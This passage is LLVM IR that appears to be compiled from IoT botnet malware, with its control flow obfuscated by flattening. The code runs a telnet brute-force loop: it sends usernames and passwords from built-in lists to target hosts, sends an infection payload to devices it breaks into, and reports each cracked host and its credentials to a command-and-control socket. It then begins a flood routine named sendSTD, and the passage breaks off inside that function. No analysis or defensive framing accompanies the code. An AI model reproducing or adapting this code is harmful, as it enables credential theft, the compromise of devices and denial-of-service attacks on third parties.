; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %5, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %387
  call void @advance_state(%struct.telstate_t* %388, i32 3)
  store i32 -1799112216, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %5, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %392
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %393, i32 0, i32 7
  %395 = load i32, i32* %394, align 16
  %396 = add i32 %395, 7
  %397 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %398 = icmp ult i32 %396, %397
  %399 = select i1 %398, i32 -1910158482, i32 220230420
  store i32 %399, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %402
  call void @reset_telstate(%struct.telstate_t* %403)
  store i32 220230420, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = load i32, i32* %5, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 16
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 4
  %415 = load i8, i8* %414, align 2
  %416 = zext i8 %415 to i64
  %417 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %416
  %418 = load i8*, i8** %417, align 8
  %419 = load i32, i32* %5, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 4
  %423 = load i8, i8* %422, align 2
  %424 = zext i8 %423 to i64
  %425 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %424
  %426 = load i8*, i8** %425, align 8
  %427 = call i64 @strlen(i8* %426) #10
  %428 = call i64 @send(i32 %410, i8* %418, i64 %427, i32 16384)
  %429 = icmp slt i64 %428, 0
  %430 = select i1 %429, i32 816755183, i32 1640411324
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %433
  call void @reset_telstate(%struct.telstate_t* %434)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = load i32, i32* %5, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 16
  %441 = call i64 @send(i32 %440, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %442 = icmp slt i64 %441, 0
  %443 = select i1 %442, i32 1547330235, i32 -2112485761
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i32, i32* %5, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %446
  call void @reset_telstate(%struct.telstate_t* %447)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %450
  call void @advance_state(%struct.telstate_t* %451, i32 4)
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i32, i32* %5, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 0
  %457 = load i32, i32* %456, align 16
  %458 = load i32, i32* %3, align 4
  %459 = load i32, i32* %5, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 9
  %463 = load i8*, i8** %462, align 8
  %464 = call i32 @read_until_response(i32 %457, i32 %458, i8* %463, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %465 = icmp ne i32 %464, 0
  %466 = select i1 %465, i32 962439541, i32 -733906261
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i32, i32* %5, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 9
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @contains_fail(i8* %472)
  %474 = icmp ne i32 %473, 0
  %475 = select i1 %474, i32 1732920767, i32 446264815
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load i32, i32* %5, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %478
  call void @advance_state(%struct.telstate_t* %479, i32 0)
  store i32 1168916991, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i32, i32* %5, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %482
  call void @advance_state(%struct.telstate_t* %483, i32 5)
  store i32 1168916991, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 7
  %490 = load i32, i32* %489, align 16
  %491 = add i32 %490, 3
  %492 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %493 = icmp ult i32 %491, %492
  %494 = select i1 %493, i32 1535466053, i32 889351740
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i32, i32* %5, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %497
  call void @reset_telstate(%struct.telstate_t* %498)
  store i32 889351740, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i32, i32* %5, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 0
  %505 = load i32, i32* %504, align 16
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 5
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i64
  %512 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %511
  %513 = load i8*, i8** %512, align 8
  %514 = load i32, i32* %5, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 5
  %518 = load i8, i8* %517, align 1
  %519 = zext i8 %518 to i64
  %520 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %519
  %521 = load i8*, i8** %520, align 8
  %522 = call i64 @strlen(i8* %521) #10
  %523 = call i64 @send(i32 %505, i8* %513, i64 %522, i32 16384)
  %524 = icmp slt i64 %523, 0
  %525 = select i1 %524, i32 1340436753, i32 -464424977
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i32, i32* %5, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %528
  call void @reset_telstate(%struct.telstate_t* %529)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32, i32* %5, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = call i64 @send(i32 %535, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %537 = icmp slt i64 %536, 0
  %538 = select i1 %537, i32 -1291855343, i32 -30639528
  store i32 %538, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* %5, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %541
  call void @reset_telstate(%struct.telstate_t* %542)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i32, i32* %5, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %545
  call void @advance_state(%struct.telstate_t* %546, i32 6)
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i32, i32* %5, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 16
  %553 = load i32, i32* %3, align 4
  %554 = load i32, i32* %5, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 9
  %558 = load i8*, i8** %557, align 8
  %559 = call i32 @read_until_response(i32 %552, i32 %553, i8* %558, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %560 = icmp ne i32 %559, 0
  %561 = select i1 %560, i32 -867849265, i32 819037957
  store i32 %561, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %564 = load i32, i32* %5, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 7
  store i32 %563, i32* %567, align 16
  %568 = load i32, i32* %5, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 9
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @contains_fail(i8* %572)
  %574 = icmp ne i32 %573, 0
  %575 = select i1 %574, i32 1105108939, i32 1119657204
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i32, i32* %5, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %578
  call void @advance_state(%struct.telstate_t* %579, i32 0)
  store i32 -1160115094, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = load i32, i32* %5, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 9
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @contains_success(i8* %585)
  %587 = icmp ne i32 %586, 0
  %588 = select i1 %587, i32 1313779483, i32 337003084
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i32, i32* %5, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 3
  %594 = load i8, i8* %593, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp eq i32 %595, 2
  %597 = select i1 %596, i32 309544645, i32 -2103146226
  store i32 %597, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  %599 = load i32, i32* %5, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %600
  call void @advance_state(%struct.telstate_t* %601, i32 7)
  store i32 1238018840, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  %603 = load i32, i32* @mainCommSock, align 4
  %604 = load i32, i32* %5, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %605
  %607 = call i8* @get_telstate_host(%struct.telstate_t* %606)
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 4
  %612 = load i8, i8* %611, align 2
  %613 = zext i8 %612 to i64
  %614 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %613
  %615 = load i8*, i8** %614, align 8
  %616 = load i32, i32* %5, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 5
  %620 = load i8, i8* %619, align 1
  %621 = zext i8 %620 to i64
  %622 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %621
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 (i32, i8*, ...) @sockprintf(i32 %603, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.138, i32 0, i32 0), i8* %607, i8* %615, i8* %623)
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %626
  call void @advance_state(%struct.telstate_t* %627, i32 7)
  store i32 1238018840, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  store i32 409922896, i32* %switchVar
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  %630 = load i32, i32* %5, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %631
  call void @reset_telstate(%struct.telstate_t* %632)
  store i32 409922896, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  store i32 -1160115094, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i32, i32* %5, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 7
  %640 = load i32, i32* %639, align 16
  %641 = add i32 %640, 7
  %642 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %643 = icmp ult i32 %641, %642
  %644 = select i1 %643, i32 1941000021, i32 1549061744
  store i32 %644, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %647
  call void @reset_telstate(%struct.telstate_t* %648)
  store i32 1549061744, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %652 = load i32, i32* %5, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 7
  store i32 %651, i32* %655, align 16
  %656 = load i32, i32* %5, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 0
  %660 = load i32, i32* %659, align 16
  %661 = call i64 @send(i32 %660, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i64 4, i32 16384)
  %662 = icmp slt i64 %661, 0
  %663 = select i1 %662, i32 -1914873166, i32 -722925166
  store i32 %663, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  store i32 -722925166, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %5, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 0
  %670 = load i32, i32* %669, align 16
  %671 = call i64 @send(i32 %670, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i32 0, i32 0), i64 7, i32 16384)
  %672 = icmp slt i64 %671, 0
  %673 = select i1 %672, i32 -1969197637, i32 -641316849
  store i32 %673, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  store i32 -641316849, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = load i32, i32* %5, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 16
  %681 = load i8*, i8** @infect, align 8
  %682 = load i8*, i8** @infect, align 8
  %683 = call i64 @strlen(i8* %682) #10
  %684 = call i64 @send(i32 %680, i8* %681, i64 %683, i32 16384)
  %685 = icmp slt i64 %684, 0
  %686 = select i1 %685, i32 -132054339, i32 1304713727
  store i32 %686, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* @mainCommSock, align 4
  %689 = load i32, i32* %5, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %690
  %692 = call i8* @get_telstate_host(%struct.telstate_t* %691)
  %693 = load i32, i32* %5, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 4
  %697 = load i8, i8* %696, align 2
  %698 = zext i8 %697 to i64
  %699 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %698
  %700 = load i8*, i8** %699, align 8
  %701 = load i32, i32* %5, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 5
  %705 = load i8, i8* %704, align 1
  %706 = zext i8 %705 to i64
  %707 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %706
  %708 = load i8*, i8** %707, align 8
  %709 = call i32 (i32, i8*, ...) @sockprintf(i32 %688, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.141, i32 0, i32 0), i8* %692, i8* %700, i8* %708)
  %710 = load i32, i32* %5, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %711
  call void @reset_telstate(%struct.telstate_t* %712)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i32, i32* %5, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 7
  %718 = load i32, i32* %717, align 16
  %719 = add i32 %718, 25
  %720 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %721 = icmp ult i32 %719, %720
  %722 = select i1 %721, i32 867025086, i32 1960185210
  store i32 %722, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load i32, i32* @mainCommSock, align 4
  %725 = load i32, i32* %5, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %726
  %728 = call i8* @get_telstate_host(%struct.telstate_t* %727)
  %729 = load i32, i32* %5, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 4
  %733 = load i8, i8* %732, align 2
  %734 = zext i8 %733 to i64
  %735 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %734
  %736 = load i8*, i8** %735, align 8
  %737 = load i32, i32* %5, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 5
  %741 = load i8, i8* %740, align 1
  %742 = zext i8 %741 to i64
  %743 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %742
  %744 = load i8*, i8** %743, align 8
  %745 = call i32 (i32, i8*, ...) @sockprintf(i32 %724, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.142, i32 0, i32 0), i8* %728, i8* %736, i8* %744)
  %746 = load i32, i32* %5, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 3
  %750 = load i8, i8* %749, align 1
  %751 = zext i8 %750 to i32
  %752 = icmp ne i32 %751, 3
  %753 = select i1 %752, i32 -726578202, i32 -1682554282
  store i32 %753, i32* %switchVar
  br label %loopEnd

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i32, i32* @mainCommSock, align 4
  %756 = load i32, i32* %5, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %757
  %759 = call i8* @get_telstate_host(%struct.telstate_t* %758)
  %760 = load i32, i32* %5, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 4
  %764 = load i8, i8* %763, align 2
  %765 = zext i8 %764 to i64
  %766 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %765
  %767 = load i8*, i8** %766, align 8
  %768 = load i32, i32* %5, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 5
  %772 = load i8, i8* %771, align 1
  %773 = zext i8 %772 to i64
  %774 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %773
  %775 = load i8*, i8** %774, align 8
  %776 = call i32 (i32, i8*, ...) @sockprintf(i32 %755, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.143, i32 0, i32 0), i8* %759, i8* %767, i8* %775)
  store i32 -1682554282, i32* %switchVar
  br label %loopEnd

; <label>:777:                                    ; preds = %loopEntry
  %778 = load i32, i32* %5, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %779
  call void @reset_telstate(%struct.telstate_t* %780)
  store i32 1960185210, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  %784 = load i32, i32* %5, align 4
  %785 = add nsw i32 %784, 1
  store i32 %785, i32* %5, align 4
  store i32 247693374, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  store i32 108160413, i32* %switchVar
  br label %loopEnd

; <label>:787:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %786, %783, %782, %NewDefault, %781, %777, %754, %723, %713, %687, %675, %674, %665, %664, %650, %649, %645, %635, %634, %633, %629, %628, %602, %598, %589, %580, %576, %562, %547, %543, %539, %530, %526, %500, %499, %495, %485, %484, %480, %476, %467, %452, %448, %444, %435, %431, %405, %404, %400, %390, %389, %385, %381, %372, %357, %356, %352, %342, %341, %337, %333, %332, %315, %311, %300, %266, %265, %256, %255, %254, %250, %246, %241, %218, %217, %192, %191, %190, %185, %176, %171, %150, %141, %121, %112, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %96, %90, %82, %77, %76, %75, %74, %73, %65, %64, %61, %47, %42, %switchDefault
  br label %loopEntry
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
